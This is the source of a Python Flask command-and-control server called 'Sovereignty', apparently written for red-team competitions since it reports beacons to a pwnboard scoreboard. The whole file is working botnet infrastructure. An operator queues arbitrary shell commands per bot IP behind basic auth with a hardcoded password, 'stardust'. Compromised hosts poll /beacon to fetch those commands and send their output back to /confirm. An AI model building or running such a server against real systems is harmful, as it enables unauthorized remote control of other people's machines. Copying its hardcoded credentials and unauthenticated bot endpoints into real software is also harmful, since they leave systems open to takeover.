#!/usr/bin/python3
from flask import Flask, render_template, request
from flask_httpauth import HTTPBasicAuth
from werkzeug.security import generate_password_hash, check_password_hash
from collections import defaultdict
from collections import defaultdict
import os, json, time, requests
import sqlalchemy as db


#os.system('docker-compose up  -d --build')
#time.sleep(10)
#engine = db.create_engine('mysql+pymysql://admin:stardust@localhost:3306/Sovereignty')
#connection = engine.connect()
#metadata = db.MetaData()
#sov = db.Table('Sovereignty', metadata, autoload=True, autoload_with=engine)
#print(sov.columns.keys())

#insp = db.inspect(engine)
#db_list = insp.get_schema_names()
#print(db_list)

bots = defaultdict(list)
botsExe = defaultdict(list)
botLst = []
app = Flask(__name__)
auth = HTTPBasicAuth()

users = {
    "admin": generate_password_hash("stardust")
}

@auth.verify_password
def login(username, password):
    if username in users:
        return check_password_hash(users.get(username), password)
    return False


lastOutput = ''
"""
Function: index
Parameters: None
Returns: HTML to serve as well as variables to fill
Description: Landing page for server.
			 Shows active bots as well as takes commands to send
"""
@app.route('/')
@auth.login_required
def index():
	botIP = request.args.get('botIP')#.replace(' ', '').split(',')
	command = request.args.get('command')
	#for bot in botIPs:
	bots[botIP].append(command)
	for bot in bots:
		if bot not in botLst and bot != None:
			botLst.append(bot)		
	return render_template('form.html', command=command, botIP=botIP, bots=botsExe)


"""
Function: beacon
Parameters: None
Returns: json of commands for bot to execute
Description: page bot beacons to for get commands
"""	
@app.route('/beacon')
def beacon():
	ip = request.args.get('ip')
	#updatePwnboard(ip)
	if ip not in bots:
		bots[ip] = []
		botsExe[ip] = []
	else:
		print(json.dumps(bots[ip]))
		return json.dumps(bots[ip])
	return json.dumps('')
		
"""
Function: confirm
Parameters: None
Returns: True
Description: Page for bot to send confirmation to after executing commands
			 clears queue of commands for bot
"""
#TODO check if new commands have been added to queue before clearing them
#TODO handle return of command output
@app.route('/confirm')
def confirm():
	ip = request.args.get('ip')
	cmd = request.args.get('cmd')
	output = request.args.get('output')
	lastOutput = output
	#Recieve commands executed and remove them from the queue
	if cmd in bots[ip]:
		bots[ip].remove(cmd)
		botsExe[ip].append((cmd, output.strip()))
	return 'True'



@app.route('/ping')
def status():
    return 'pong'


def updatePwnboard(ip):
    host = 'http://pwnboard.win/generic'
    msg = "Sovereignty received a beacon"
    if not host:
        return
    data = {'ip': ip, 'application': "Sovereignty", 'message': msg}
    try:
        req = requests.post(host, json=data, timeout=3)
        return True
    except Exception as E:
        print("Cannot update pwnboard: {}".format(E))
        return False



if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
